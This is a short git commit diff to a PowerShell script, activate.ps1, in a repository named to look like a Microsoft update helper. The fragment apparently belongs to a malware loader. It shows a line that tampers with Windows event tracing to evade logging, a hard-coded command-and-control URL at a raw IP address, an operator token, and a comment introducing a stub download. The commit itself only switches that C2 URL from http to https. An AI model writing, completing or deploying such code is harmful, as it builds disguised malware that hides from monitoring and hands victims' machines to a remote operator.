692efd0338b2b66957986049869379e9c01639dc
s7xeyes <arinataki1@gmail.com>
2026-03-26 05:12:15 +0800

    Update activate.ps1

--- activate.ps1
+++ activate.ps1
@@ -11,7 +11,7 @@ $etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()
 # === CHANGE ONLY THE c2url IF YOUR DOMAIN IS DIFFERENT ===
 $githubUser = "s7xeyes"
 $githubRepo = "Microsoft-Update-Helper"
-$c2url      = "http://176.65.132.236:5173"   # ←←← CHANGE THIS TO YOUR REAL DOMAIN
+$c2url      = "https://176.65.132.236:5173"   # ←←← CHANGE THIS TO YOUR REAL DOMAIN
 $token      = "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ"
 
 # Download the stub
